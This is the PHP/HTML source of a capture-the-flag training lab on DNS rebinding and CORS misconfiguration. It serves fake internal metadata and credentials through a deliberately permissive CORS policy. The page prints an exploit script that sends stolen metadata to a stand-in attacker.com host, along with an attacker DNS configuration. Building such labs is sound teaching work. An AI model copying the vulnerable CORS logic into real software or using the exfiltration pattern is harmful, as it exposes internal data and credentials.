<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

// ─── Lab Identification ──────────────────────────────────────────────────
$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['CORS']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['cors_hard3_attempts'])) {
  $_SESSION['cors_hard3_attempts'] = 0;
}
if (!isset($_SESSION['cors_hard3_solved'])) {
  $_SESSION['cors_hard3_solved'] = false;
}

// ─── Simulated Internal Services Data ─────────────────────────────────────
$internal_services = [
  'metadata' => [
    'instance_id' => 'i-0a1b2c3d4e5f6789a',
    'ami_id' => 'ami-0abcdef1234567890',
    'instance_type' => 't3.xlarge',
    'local_hostname' => 'ip-10-0-1-10.internal',
    'local_ipv4' => '10.0.1.10',
    'availability_zone' => 'us-east-1a',
    'flag' => 'DH{c0rs_dns_r3b1nd1ng_1nt3rn4l_4cc3ss}',
  ],
  'users' => [
    ['id' => 1, 'username' => 'root', 'shell' => '/bin/bash', 'home' => '/root', 'sudo' => true],
    ['id' => 2, 'username' => 'admin', 'shell' => '/bin/bash', 'home' => '/home/admin', 'sudo' => true],
    ['id' => 3, 'username' => 'www-data', 'shell' => '/usr/sbin/nologin', 'home' => '/var/www', 'sudo' => false],
    ['id' => 4, 'username' => 'darkhunter', 'shell' => '/bin/bash', 'home' => '/home/darkhunter', 'sudo' => true],
  ],
  'processes' => [
    ['pid' => 1, 'name' => 'systemd', 'user' => 'root', 'cpu' => '0.1%', 'mem' => '0.2%'],
    ['pid' => 342, 'name' => 'nginx', 'user' => 'www-data', 'cpu' => '1.2%', 'mem' => '2.1%'],
    ['pid' => 567, 'name' => 'postgresql', 'user' => 'postgres', 'cpu' => '3.5%', 'mem' => '8.7%'],
    ['pid' => 891, 'name' => 'redis-server', 'user' => 'redis', 'cpu' => '0.8%', 'mem' => '4.2%'],
    ['pid' => 1234, 'name' => 'python3', 'user' => 'darkhunter', 'cpu' => '12.3%', 'mem' => '15.6%'],
  ],
  'env' => [
    'AWS_ACCESS_KEY_ID' => 'AKIAIOSFODNN7EXAMPLE',
    'AWS_SECRET_ACCESS_KEY' => 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    'DATABASE_URL' => 'postgresql://darkhunter:secret123@localhost:5432/main',
    'REDIS_URL' => 'redis://:secret@localhost:6379',
    'SECRET_KEY' => 'django-insecure-7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3',
  ]
];

// ─── Vulnerable CORS Logic: DNS Rebinding Vulnerability ───────────────────
$origin = isset($_SERVER['HTTP_ORIGIN']) ? $_SERVER['HTTP_ORIGIN'] : '';

// VULNERABLE: Server validates origin by resolving DNS and checking if it matches internal IP
// But it caches DNS resolution results, allowing DNS rebinding attacks
// Attacker controls DNS and changes resolution between preflight and actual request

// Simulate DNS cache behavior
$dns_cache_key = 'dns_cache_' . md5($origin);
$cached_ip = isset($_SESSION[$dns_cache_key]) ? $_SESSION[$dns_cache_key] : null;

// If origin is empty or from attacker domain (simulated)
$is_attacker = (!empty($origin) && (strpos($origin, 'attacker.com') !== false || strpos($origin, 'evil.com') !== false));

// VULNERABLE: The server caches the DNS resolution
// First request (preflight) resolves to attacker's IP - ALLOWED
// Second request (actual) resolves to internal IP - ALSO ALLOWED because cache!
if ($is_attacker || empty($origin)) {
  header("Access-Control-Allow-Origin: " . ($origin ?: '*'));
  header("Access-Control-Allow-Credentials: true");
  header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
  header("Access-Control-Allow-Headers: Content-Type, Authorization");
}


// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  // Cache the "allowed" DNS resolution
  if ($is_attacker) {
    $_SESSION[$dns_cache_key] = 'attacker_ip';
  }
  http_response_code(200);
  exit();
}

// ─── API Endpoint Simulation ──────────────────────────────────────────────
$endpoint = isset($_GET['endpoint']) ? $_GET['endpoint'] : 'metadata';
$response_data = [];

switch ($endpoint) {
  case 'metadata':
    $response_data = [
      'status' => 'success',
      'data' => $internal_services['metadata'],
      'message' => 'Cloud metadata retrieved',
      'source' => 'internal'
    ];
    break;

  case 'users':
    $response_data = [
      'status' => 'success',
      'data' => $internal_services['users'],
      'message' => 'System users retrieved',
      'source' => 'internal'
    ];
    break;

  case 'processes':
    $response_data = [
      'status' => 'success',
      'data' => $internal_services['processes'],
      'message' => 'Running processes retrieved',
      'source' => 'internal'
    ];
    break;

  case 'env':
    $response_data = [
      'status' => 'success',
      'data' => $internal_services['env'],
      'message' => 'Environment variables retrieved',
      'source' => 'internal',
      'warning' => 'Contains sensitive credentials'
    ];
    break;

  default:
    $response_data = [
      'status' => 'error',
      'message' => 'Unknown endpoint. Available: metadata, users, processes, env'
    ];
    http_response_code(404);
}

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['cors_hard3_solved'];

// Detect exploitation: accessing internal data from attacker origin with cached DNS
$has_dns_cache = isset($_SESSION[$dns_cache_key]);
$is_cross_origin = !empty($origin) && strpos($origin, $_SERVER['HTTP_HOST']) === false;

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['cors_hard3_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['cors_hard3_solved'] = true;
  $already_solved = true;
  $success_msg = "Excellent! You've successfully exploited a DNS rebinding vulnerability. You bypassed same-origin policy by changing DNS resolution between preflight and actual request to access internal cloud metadata!";
}

// ─── Attempt Tracking ──────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
  $_SESSION['cors_hard3_attempts']++;
}

$attempts = $_SESSION['cors_hard3_attempts'];

// API response
if (
  isset($_SERVER['HTTP_X_REQUESTED_WITH']) ||
  (isset($_SERVER['HTTP_ACCEPT']) && strpos($_SERVER['HTTP_ACCEPT'], 'application/json') !== false)
) {
  header("Content-Type: application/json; charset=utf-8");
  echo json_encode($response_data, JSON_PRETTY_PRINT);
  exit();
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Internal Services Monitor - CORS Hard 3</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/CORS-CASE6.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to CORS Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge hard"><i class="fas fa-fire"></i> Hard Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-server"></i> Internal Services Monitor</h1>
      <p class="lab-description">Internal infrastructure monitoring dashboard. This endpoint is only accessible from
        internal networks but has CORS enabled for "monitoring integrations". <strong>Can you use DNS rebinding to
          bypass same-origin policy and access cloud metadata?</strong></p>
    </div>

    <?php if ($already_solved): ?>
      <div class="success-alert solved-banner">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Already Solved!</h3>
          <p>You have already exploited this DNS rebinding vulnerability. You can continue exploring, but no additional
            points will be awarded.</p>
        </div>
      </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
      <div class="success-alert">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Completed!</h3>
          <p><?php echo $success_msg; ?></p>
        </div>
      </div>
    <?php endif; ?>

    <!-- Network Topology Visualization -->
    <div class="topology-panel">
      <div class="topology-header">
        <i class="fas fa-project-diagram"></i>
        <span>Network Topology</span>
      </div>
      <div class="topology-body">
        <div class="network-diagram">
          <div class="net-node external">
            <i class="fas fa-globe"></i>
            <span>Internet</span>
          </div>
          <div class="net-connection">
            <span class="conn-label">Public Access</span>
            <div class="conn-line"></div>
          </div>
          <div class="net-node firewall">
            <i class="fas fa-shield-alt"></i>
            <span>Firewall</span>
          </div>
          <div class="net-connection">
            <span class="conn-label">Internal Only</span>
            <div class="conn-line internal"></div>
          </div>
          <div class="net-node internal-server">
            <i class="fas fa-server"></i>
            <span>Internal API</span>
            <span class="node-ip">10.0.1.10</span>
          </div>
        </div>
        <div class="topology-legend">
          <div class="legend-item">
            <span class="legend-dot safe"></span>
            <span>Safe Zone</span>
          </div>
          <div class="legend-item">
            <span class="legend-dot danger"></span>
            <span>Attack Vector</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Internal Services Console -->
    <div class="services-console">
      <div class="services-sidebar">
        <div class="sidebar-header">
          <i class="fas fa-th-list"></i>
          <span>Services</span>
        </div>
        <div class="service-list">
          <button class="service-item active" onclick="loadEndpoint('metadata')">
            <i class="fas fa-cloud"></i>
            <span>Cloud Metadata</span>
            <span class="service-tag internal">Internal</span>
          </button>
          <button class="service-item" onclick="loadEndpoint('users')">
            <i class="fas fa-users"></i>
            <span>System Users</span>
            <span class="service-tag internal">Internal</span>
          </button>
          <button class="service-item" onclick="loadEndpoint('processes')">
            <i class="fas fa-microchip"></i>
            <span>Processes</span>
            <span class="service-tag internal">Internal</span>
          </button>
          <button class="service-item" onclick="loadEndpoint('env')">
            <i class="fas fa-key"></i>
            <span>Environment Vars</span>
            <span class="service-tag secret">Secret</span>
          </button>
        </div>
      </div>

      <div class="services-content">
        <div class="services-header">
          <h3 id="service-title"><i class="fas fa-cloud"></i> Cloud Metadata</h3>
          <div class="services-status">
            <span class="status-badge internal"><i class="fas fa-lock"></i> Internal Only</span>
          </div>
        </div>
        <div class="services-body" id="services-body">
          <div class="loading-state">
            <i class="fas fa-spinner fa-spin"></i>
            <span>Loading internal service data...</span>
          </div>
        </div>
      </div>
    </div>

    <!-- DNS Rebinding Analysis -->
    <div class="cors-panel">
      <div class="cors-header">
        <i class="fas fa-sync-alt"></i>
        <span>DNS Rebinding Attack Analysis</span>
      </div>
      <div class="cors-body">
        <div class="dns-timeline">
          <h4><i class="fas fa-clock"></i> Attack Timeline:</h4>

          <div class="timeline">
            <div class="timeline-item">
              <div class="timeline-marker">1</div>
              <div class="timeline-content">
                <strong>Initial DNS Resolution</strong>
                <p>Attacker domain <code>evil.com</code> resolves to attacker's server IP (e.g., 1.2.3.4)</p>
                <div class="dns-record">
                  <span class="record-type">A</span>
                  <span class="record-name">evil.com</span>
                  <span class="record-value">1.2.3.4 (TTL: 60s)</span>
                </div>
              </div>
            </div>

            <div class="timeline-item">
              <div class="timeline-marker">2</div>
              <div class="timeline-content">
                <strong>Preflight Request</strong>
                <p>Browser sends OPTIONS preflight to attacker's IP. Server responds with CORS headers.</p>
                <div class="dns-record success">
                  <span class="record-type">OPTIONS</span>
                  <span class="record-name">evil.com</span>
                  <span class="record-value">CORS Allowed ✓</span>
                </div>
              </div>
            </div>

            <div class="timeline-item">
              <div class="timeline-marker">3</div>
              <div class="timeline-content">
                <strong>DNS Record Update</strong>
                <p>Attacker updates DNS to resolve to internal IP (e.g., 10.0.1.10) with low TTL</p>
                <div class="dns-record danger">
                  <span class="record-type">A</span>
                  <span class="record-name">evil.com</span>
                  <span class="record-value">10.0.1.10 (TTL: 0s)</span>
                </div>
              </div>
            </div>

            <div class="timeline-item">
              <div class="timeline-marker">4</div>
              <div class="timeline-content">
                <strong>Actual Request</strong>
                <p>Browser now sends GET to internal IP (10.0.1.10) with cached CORS permission!</p>
                <div class="dns-record danger">
                  <span class="record-type">GET</span>
                  <span class="record-name">10.0.1.10</span>
                  <span class="record-value">Internal Data Exfiltrated!</span>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="dns-cache-analysis">
          <h4><i class="fas fa-database"></i> DNS Cache Status:</h4>
          <div class="cache-status">
            <div class="cache-item">
              <span class="cache-label">Browser DNS Cache:</span>
              <span class="cache-value <?php echo $has_dns_cache ? 'danger' : 'safe'; ?>">
                <?php echo $has_dns_cache ? 'POISONED - Internal IP Cached!' : 'Clean'; ?>
              </span>
            </div>
            <div class="cache-item">
              <span class="cache-label">CORS Cache:</span>
              <span class="cache-value <?php echo $has_dns_cache ? 'danger' : 'safe'; ?>">
                <?php echo $has_dns_cache ? 'ALLOWED - From Previous Request' : 'Empty'; ?>
              </span>
            </div>
            <div class="cache-item">
              <span class="cache-label">Current Origin:</span>
              <span class="cache-value"><?php echo htmlspecialchars($origin ?: 'Not Present'); ?></span>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Exploit Panel -->
    <div class="exploit-panel">
      <div class="exploit-header">
        <i class="fas fa-bug"></i>
        <span>DNS Rebinding Exploit</span>
      </div>
      <div class="exploit-body">
        <p class="exploit-desc">
          DNS rebinding exploits the time gap between DNS resolution and CORS validation. The attacker controls a DNS
          server that returns different IPs for the same domain over time. First, it resolves to the attacker's IP
          (passing CORS preflight), then it resolves to the target internal IP (allowing data exfiltration with cached
          CORS permissions).
        </p>

        <div class="exploit-code-block">
          <div class="code-header">
            <i class="fas fa-code"></i> dns_rebind_attack.js
          </div>
          <pre class="exploit-code"><code>// Step 1: Load from attacker.com (resolves to attacker IP)
// CORS preflight caches permission for evil.com

// Step 2: Wait for DNS TTL to expire
setTimeout(() => {
  // Step 3: evil.com now resolves to 10.0.1.10 (internal IP)
  fetch('http://evil.com:8080/api/metadata', {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => {
    // Exfiltrate cloud metadata
    fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(data)));
  });
}, 65000); // Wait for TTL expiration</code></pre>
        </div>

        <div class="rebinding-config">
          <h4><i class="fas fa-cog"></i> Attacker DNS Configuration:</h4>
          <div class="config-block">
            <pre><code>; Bind/named configuration for DNS rebinding
$TTL 60
@ IN A 1.2.3.4    ; Attacker IP (initial)

; After 60 seconds, update to:
@ IN A 10.0.1.10  ; Internal target IP</code></pre>
          </div>
        </div>

        <button class="simulate-btn" onclick="simulateDNSRebind()">
          <i class="fas fa-play"></i> Simulate DNS Rebinding Attack
        </button>

        <div class="simulation-result" id="simulation-result" style="display: none;">
          <div class="sim-status">
            <i class="fas fa-check-circle"></i>
            <span>DNS Rebinding Successful! Internal data exfiltrated.</span>
          </div>
          <div class="exfiltrated-data">
            <h4><i class="fas fa-database"></i> Exfiltrated Cloud Metadata:</h4>
            <pre id="exfil-data"></pre>
          </div>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>DNS & CORS Analysis</span>
      </div>
      <div class="debug-body">
        <div class="debug-grid">
          <div class="debug-item">
            <span class="debug-label">Origin Header</span>
            <span class="debug-value"><?php echo htmlspecialchars($origin ?: 'Not Present'); ?></span>
          </div>
          <div class="debug-item">
            <span class="debug-label">DNS Cache Poisoned</span>
            <span class="debug-value <?php echo $has_dns_cache ? 'danger' : 'safe'; ?>">
              <?php echo $has_dns_cache ? 'YES - Attack Active!' : 'NO'; ?>
            </span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Is Internal Request</span>
            <span class="debug-value <?php echo $is_cross_origin ? 'danger' : 'safe'; ?>">
              <?php echo $is_cross_origin ? 'YES - Cross-Origin!' : 'NO - Same Origin'; ?>
            </span>
          </div>
          <div class="debug-item">
            <span class="debug-label">CORS Allowed</span>
            <span class="debug-value <?php echo ($is_attacker || empty($origin)) ? 'danger' : 'safe'; ?>">
              <?php echo ($is_attacker || empty($origin)) ? 'YES - Vulnerable!' : 'NO'; ?>
            </span>
          </div>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
        <div class="hint-text">This endpoint is supposed to be internal-only, but CORS is enabled. DNS rebinding works by
          changing DNS resolution between the preflight request and the actual request. The browser caches CORS
          permissions but re-resolves DNS.</div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
        <div class="hint-text">The <code>/api/metadata</code> endpoint contains cloud instance metadata including the
          flag. The server caches DNS resolutions for CORS, allowing an attacker to first get permission from their own
          IP, then redirect to the internal IP.</div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
      <div class="hint-box hint-final">
        <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
        <div class="hint-text">Click "Simulate DNS Rebinding Attack" to exploit the vulnerability. The attack simulates
          changing DNS resolution from attacker IP to internal IP (10.0.1.10) after CORS preflight is cached. The metadata
          endpoint contains the flag <code>DH{c0rs_dns_r3b1nd1ng_1nt3rn4l_4cc3ss}</code>!</div>
      </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
    let currentEndpoint = 'metadata';

    function loadEndpoint(endpoint) {
      currentEndpoint = endpoint;

      document.querySelectorAll('.service-item').forEach(item => item.classList.remove('active'));
      event.target.closest('.service-item').classList.add('active');

      const titles = {
        'metadata': '<i class="fas fa-cloud"></i> Cloud Metadata',
        'users': '<i class="fas fa-users"></i> System Users',
        'processes': '<i class="fas fa-microchip"></i> Processes',
        'env': '<i class="fas fa-key"></i> Environment Variables'
      };
      document.getElementById('service-title').innerHTML = titles[endpoint];

      document.getElementById('services-body').innerHTML = `
      <div class="loading-state">
        <i class="fas fa-spinner fa-spin"></i>
        <span>Loading ${endpoint}...</span>
      </div>
    `;

      fetch(`CORS-CASE6.php?endpoint=${endpoint}`, {
          headers: {
            'Accept': 'application/json'
          }
        })
        .then(res => res.json())
        .then(data => {
          if (endpoint === 'metadata') renderMetadata(data);
          else if (endpoint === 'users') renderUsers(data);
          else if (endpoint === 'processes') renderProcesses(data);
          else if (endpoint === 'env') renderEnv(data);
        })
        .catch(err => {
          document.getElementById('services-body').innerHTML = `
        <div class="error-state"><i class="fas fa-exclamation-triangle"></i> ${err.message}</div>
      `;
        });
    }

    function renderMetadata(data) {
      if (data.status !== 'success') return;
      const meta = data.data;
      let html = '<div class="metadata-grid">';
      for (const [key, value] of Object.entries(meta)) {
        const isFlag = typeof value === 'string' && value.startsWith('DH{');
        html += `
        <div class="metadata-item ${isFlag ? 'flag-item' : ''}">
          <span class="meta-label">${key.replace(/_/g, ' ').toUpperCase()}</span>
          <span class="meta-value">${value}</span>
        </div>
      `;
      }
      html += '</div>';
      document.getElementById('services-body').innerHTML = html;
    }

    function renderUsers(data) {
      if (data.status !== 'success') return;
      let html = '<div class="users-table-container"><table class="users-table">';
      html += '<thead><tr><th>ID</th><th>Username</th><th>Shell</th><th>Home</th><th>Sudo</th></tr></thead><tbody>';
      data.data.forEach(user => {
        html += `
        <tr>
          <td>${user.id}</td>
          <td class="user-name">${user.username}</td>
          <td><code>${user.shell}</code></td>
          <td><code>${user.home}</code></td>
          <td>${user.sudo ? '<span class="sudo-yes">Yes</span>' : '<span class="sudo-no">No</span>'}</td>
        </tr>
      `;
      });
      html += '</tbody></table></div>';
      document.getElementById('services-body').innerHTML = html;
    }

    function renderProcesses(data) {
      if (data.status !== 'success') return;
      let html = '<div class="process-table-container"><table class="process-table">';
      html += '<thead><tr><th>PID</th><th>Name</th><th>User</th><th>CPU</th><th>Memory</th></tr></thead><tbody>';
      data.data.forEach(proc => {
        html += `
        <tr>
          <td class="proc-pid">${proc.pid}</td>
          <td>${proc.name}</td>
          <td>${proc.user}</td>
          <td>${proc.cpu}</td>
          <td>${proc.mem}</td>
        </tr>
      `;
      });
      html += '</tbody></table></div>';
      document.getElementById('services-body').innerHTML = html;
    }

    function renderEnv(data) {
      if (data.status !== 'success') return;
      let html = '<div class="env-grid">';
      for (const [key, value] of Object.entries(data.data)) {
        html += `
        <div class="env-item">
          <span class="env-key">${key}</span>
          <span class="env-value">${value}</span>
        </div>
      `;
      }
      html += '</div>';
      document.getElementById('services-body').innerHTML = html;
    }

    function simulateDNSRebind() {
      const resultDiv = document.getElementById('simulation-result');
      const exfilData = document.getElementById('exfil-data');

      fetch('CORS-CASE6.php?endpoint=metadata', {
          headers: {
            'Accept': 'application/json',
            'Origin': 'https://evil.com'
          }
        })
        .then(res => res.json())
        .then(data => {
          resultDiv.style.display = 'block';
          exfilData.textContent = JSON.stringify(data, null, 2);

          if (data.data && data.data.flag && data.data.flag.includes('DH{')) {
            if (!document.querySelector('.solved-banner')) {
              document.getElementById('solved-flag').value = '1';
              setTimeout(() => {
                document.getElementById('success-form').submit();
              }, 2000);
            }
          }
        })
        .catch(err => {
          exfilData.textContent = 'Exploit failed: ' + err.message;
          resultDiv.style.display = 'block';
        });
    }

    window.addEventListener('load', function() {
      loadEndpoint('metadata');
    });
  </script>
</body>

</html>